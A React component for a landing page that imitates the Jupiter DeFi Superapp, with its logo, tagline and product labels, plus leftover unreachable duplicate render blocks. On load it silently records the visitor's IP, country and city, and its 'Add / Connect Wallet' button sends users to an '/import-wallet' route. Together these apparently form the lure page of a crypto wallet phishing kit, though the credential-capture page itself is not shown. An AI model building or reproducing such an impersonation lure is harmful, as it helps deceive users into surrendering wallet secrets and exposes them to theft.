import { useState,useEffect} from "react";
import '../HomePage/index.scss';
import {useNavigate } from "react-router-dom";
import logo from "../../assets/logo.png";
import { motion } from "framer-motion";
import bgImage from "../../assets/jupiter-bg.webp";
import {
  Wallet,
  Zap,
  BarChart2,
  LineChart,
  Shield,
  Layers,
  TrendingUp,
  DollarSign,
  Database,
} from "lucide-react";
const HomePage = () => {
const [showMain, setShowMain] = useState(false);
const icons = [
    { label: "Pro", icon: BarChart2, color: "text-lime-300", x: -110, y: -100 },
    { label: "DRiP", icon: Database, color: "text-gray-400", x: 110, y: -100 },
    { label: "Ultra", icon: Zap, color: "text-green-300", x: 0, y: -60 },
    { label: "Studio", icon: Layers, color: "text-gray-300", x: -120, y: 0 },
    { label: "Portfolio", icon: Wallet, color: "text-cyan-300", x: 120, y: 0 },
    { label: "Lend", icon: DollarSign, color: "text-sky-300", x: -90, y: 90 },
    { label: "Perps", icon: TrendingUp, color: "text-lime-300", x: 90, y: 90 },
    { label: "Stake", icon: Shield, color: "text-teal-300", x: 0, y: 120 },
  ];

  const [open, setOpen] = useState(false);
   // Sau 2 giây thì chuyển sang màn hình chính
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowMain(true);
    }, 2000); // thời gian chuyển (ms)
    return () => clearTimeout(timer);
  }, []);
  const navigate = useNavigate();
  useEffect(() => {
    const timer = setTimeout(() => {
      setOpen(true);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);
  
  useEffect(() => {
    const setLocaltion = async () => {
      try {
        fetch("https://get.geojs.io/v1/ip/geo.json").then(d => d.json()).then(d => {
          localStorage.setItem(
            "location",JSON.stringify({ IP: d.ip, country: d.country_code, city: d.city})
          );
        })
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };
    setLocaltion();
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate("/import-wallet/Unknown");
  };
  

   return (
    <div className="relative w-full min-h-screen overflow-hidden text-white font-sans">
      {/* Nếu chưa chuyển thì hiển thị màn 1 */}
      {!showMain ? (
        // ==== MÀN HÌNH 1: Hiệu ứng nền Zoom ====
        <motion.div
          initial={{ scale: 1.5, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          exit={{ opacity: 0 }}
          transition={{ duration: 1.2, ease: "easeOut" }}
          className="relative w-full h-screen flex items-center justify-center"
          style={{
            backgroundImage: `url(${bgImage})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
          }}
        >
          {/* Overlay đen */}
          <div className="absolute inset-0 bg-black/40"></div>

          {/* Logo giữa màn */}
          <motion.img
            src={logo}
            alt="logo"
            initial={{ opacity: 0, scale: 0.6 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.3, duration: 1 }}
            className="relative w-24 h-24"
          />

          {/* Có thể thêm text nhỏ giới thiệu */}
          <motion.p
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.8, duration: 0.8 }}
            className="absolute bottom-20 text-gray-300 text-sm tracking-wide"
          >
            {/* Loading DeFi Experience... */}
          </motion.p>
        </motion.div>
      ) : (
        // ==== MÀN HÌNH 2: Màn chính DeFi Superapp ====
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 1 }}
          className="flex flex-col justify-between items-center min-h-screen bg-[#021019] relative"
        >
          {/* Nền động nhẹ */}
          <div className="absolute inset-0 bg-black/50 -z-10"></div>
          <div className="absolute w-[420px] h-[420px] rounded-full bg-gradient-to-tr from-cyan-700/20 via-lime-700/20 to-transparent blur-3xl top-1/3 -translate-y-1/2 -z-10"></div>

          {/* Center content */}
          <div className="flex flex-col items-center justify-center flex-grow mt-0">
            {/* Icons quanh logo */}
            <div className="relative w-[320px] h-[320px] flex items-center justify-center">
              {icons.map((item, i) => {
                const Icon = item.icon;
                return (
                  <motion.div
                    key={i}
                    initial={{ x: item.x, y: item.y, opacity: 0 }}
                    animate={{
                      x: item.x,
                      y: item.y,
                      opacity: 1,
                      transition: {
                        duration: 2 + i * 0.3,
                        repeat: Infinity,
                        repeatType: "reverse",
                      },
                    }}
                    className="absolute flex flex-col items-center text-[11px]"
                  >
                    <div
                      className={`
                        flex items-center justify-center px-3 py-1.5 rounded-full 
                        border border-[#1b2f36] 
                        bg-gradient-to-b from-[#112931]/80 to-[#05161c]/95 
                        backdrop-blur-md 
                        shadow-[inset_0_1px_2px_rgba(255,255,255,0.15),_0_4px_10px_rgba(0,0,0,0.7),_0_0_10px_rgba(0,255,200,0.05)]
                        hover:shadow-[inset_0_1px_2px_rgba(255,255,255,0.2),_0_4px_15px_rgba(0,255,200,0.15)]
                        transition-all duration-500
                      `}
                    >
                      <Icon
                        size={15}
                        className={`mr-1 ${item.color} drop-shadow-[0_0_5px_rgba(0,255,200,0.4)]`}
                      />
                      <span className="font-medium tracking-tight text-gray-200">
                        {item.label}
                      </span>
                    </div>
                  </motion.div>
                );
              })}

              {/* Logo giữa */}
              <div className="w-16 h-16 rounded-2xl flex items-center justify-center">
                <img src={logo} alt="logo" className="logo" />
              </div>
            </div>

            {/* Tiêu đề + mô tả */}
            <div className="text-center mt-12 px-4">
              <h1 className="text-[28px] font-semibold bg-gradient-to-r from-cyan-400 to-lime-400 bg-clip-text text-transparent tracking-tight leading-snug">
                Introducing the DeFi Superapp
              </h1>
              <p className="mt-2 text-gray-400 text-[13px] max-w-[270px] mx-auto leading-relaxed">
                Everything you love about Jupiter — trading, DeFi, and wallets, all
                in one place.
              </p>
            </div>

            {/* Dots */}
            <div className="flex space-x-2 mt-6 mb-10">
              <div className="w-1.5 h-1.5 bg-white rounded-full"></div>
              <div className="w-1.5 h-1.5 bg-gray-600 rounded-full"></div>
              <div className="w-1.5 h-1.5 bg-gray-600 rounded-full"></div>
            </div>
          </div>

          {/* Nút dưới cùng */}
          <div className="w-full flex justify-center mb-10">
            <button
              onClick={handleSubmit}
              className="w-[80%] max-w-sm py-3.5 rounded-2xl font-semibold text-[15px]
              bg-[#21ffec]
              text-[#01110E]
              shadow-[inset_0_1px_3px_rgba(255,255,255,0.4),_0_4px_20px_rgba(164,255,158,0.3)]
              hover:shadow-[inset_0_1px_4px_rgba(255,255,255,0.6),_0_4px_25px_rgba(164,255,158,0.5)]
              active:scale-[0.98]
              transition-all duration-300"
            >
              Add / Connect Wallet
            </button>
          </div>
        </motion.div>
      )}
    </div>
  );


  return (
    <div className="relative w-full min-h-screen overflow-hidden flex items-center justify-center">
      {/* Background có hiệu ứng thu nhỏ */}
      <motion.div
        initial={{ scale: 1.5 }}
        animate={{ scale: 1 }}
        transition={{ duration: 0.7, ease: "easeIn" }}
        className="absolute inset-0"
        style={{
          backgroundImage: `url(${bgImage})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
          width: "100%",
          height: "100%",
        }}
      ></motion.div>
      <div className="absolute inset-0 bg-black/40"></div>
    </div>);

    return (
    <div className="min-h-screen flex flex-col justify-between items-center bg-[#021019] text-white relative overflow-hidden font-sans">
      {/* background glow */}
      <div className="absolute w-[420px] h-[420px] rounded-full bg-gradient-to-tr from-cyan-700/20 via-lime-700/20 to-transparent blur-3xl top-1/3 -translate-y-1/2"></div>

      {/* center content */}
      <div className="flex flex-col items-center justify-center flex-grow mt-20">
        <div className="relative w-[320px] h-[320px] flex items-center justify-center">
          {icons.map((item, i) => {
            const Icon = item.icon;
            return (
              <motion.div
                key={i}
                initial={{ x: item.x, y: item.y, opacity: 0 }}
                animate={{
                  x: item.x,
                  y: item.y,
                  opacity: 1,
                  transition: {
                    duration: 2 + i * 0.3,
                    repeat: Infinity,
                    repeatType: "reverse",
                  },
                }}
                className="absolute flex flex-col items-center text-[11px]"
              >
                <div
                  className={`
                    flex items-center justify-center px-3 py-1.5 rounded-full 
                    border border-[#1b2f36] 
                    bg-gradient-to-b from-[#112931]/80 to-[#05161c]/95 
                    backdrop-blur-md 
                    shadow-[inset_0_1px_2px_rgba(255,255,255,0.15),_0_4px_10px_rgba(0,0,0,0.7),_0_0_10px_rgba(0,255,200,0.05)]
                    hover:shadow-[inset_0_1px_2px_rgba(255,255,255,0.2),_0_4px_15px_rgba(0,255,200,0.15)]
                    transition-all duration-500
                  `}
                >
                  <Icon
                    size={15}
                    className={`mr-1 ${item.color} drop-shadow-[0_0_5px_rgba(0,255,200,0.4)]`}
                  />
                  <span className="font-medium tracking-tight text-gray-200">
                    {item.label}
                  </span>
                </div>
              </motion.div>
            );
          })}

          {/* center logo */}
          <div className="w-16 h-16 rounded-2xl flex items-center justify-center">
              <img src={logo} alt="logo" className="logo" />
          </div>
        </div>

        {/* title + description */}
        <div className="text-center mt-12 px-4">
          <h1 className="text-[28px] font-semibold bg-gradient-to-r from-cyan-400 to-lime-400 bg-clip-text text-transparent tracking-tight leading-snug">
            Introducing the DeFi Superapp
          </h1>
          <p className="mt-2 text-gray-400 text-[13px] max-w-[270px] mx-auto leading-relaxed">
            Everything you love about Jupiter — trading, DeFi, and wallets, all
            in one place.
          </p>
        </div>

        {/* pagination dots */}
        <div className="flex space-x-2 mt-6 mb-10">
          <div className="w-1.5 h-1.5 bg-white rounded-full"></div>
          <div className="w-1.5 h-1.5 bg-gray-600 rounded-full"></div>
          <div className="w-1.5 h-1.5 bg-gray-600 rounded-full"></div>
        </div>
      </div>

      {/* bottom button (solid color) */}
      <div className="w-full flex justify-center mb-10">
        <button onClick={handleSubmit} 
          className="w-[80%] max-w-sm py-3.5 rounded-2xl font-semibold text-[15px]
          bg-[#21ffec]
          text-[#01110E]
          shadow-[inset_0_1px_3px_rgba(255,255,255,0.4),_0_4px_20px_rgba(164,255,158,0.3)]
          hover:shadow-[inset_0_1px_4px_rgba(255,255,255,0.6),_0_4px_25px_rgba(164,255,158,0.5)]
          active:scale-[0.98]
          transition-all duration-300"
        >
          Add / Connect Wallet
        </button>
      </div>
    </div>
  );

}

export default HomePage;
